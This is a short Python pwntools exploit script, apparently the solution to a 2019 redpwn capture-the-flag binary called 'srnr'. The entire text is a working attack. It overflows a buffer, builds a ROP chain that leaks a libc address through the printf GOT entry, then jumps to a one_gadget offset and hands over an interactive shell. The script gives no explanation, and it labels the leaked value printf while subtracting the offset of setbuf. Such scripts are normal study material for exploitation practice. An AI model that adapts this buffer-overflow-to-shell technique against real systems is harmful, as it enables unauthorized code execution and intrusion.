from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

r = process('./srnr')
#r = remote('chall.2019.redpwn.net', 4008)

printf_got = 0x601fc8
printf_in_main = 0x40078b
pop_rdi = 0x400823
buf = 0x602000
pop_rsi_r15 = 0x400821

payload = 'a'*0x9 + p64(buf+0x10) + flat(pop_rdi, printf_got, printf_in_main)

r.sendlineafter(':', '0')
r.sendline(payload)

printf_addr = u64(r.recvn(7)[1:]+'\x00\x00')
libc_base = printf_addr - libc.symbols['setbuf']
system_addr = libc_base + libc.symbols['system']
print hex(system_addr)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]
print hex(one_shot)
r.sendline('0')
r.sendline('a'*9 + flat(0, pop_rsi_r15, libc_base, 0, one_shot, 0))
r.interactive()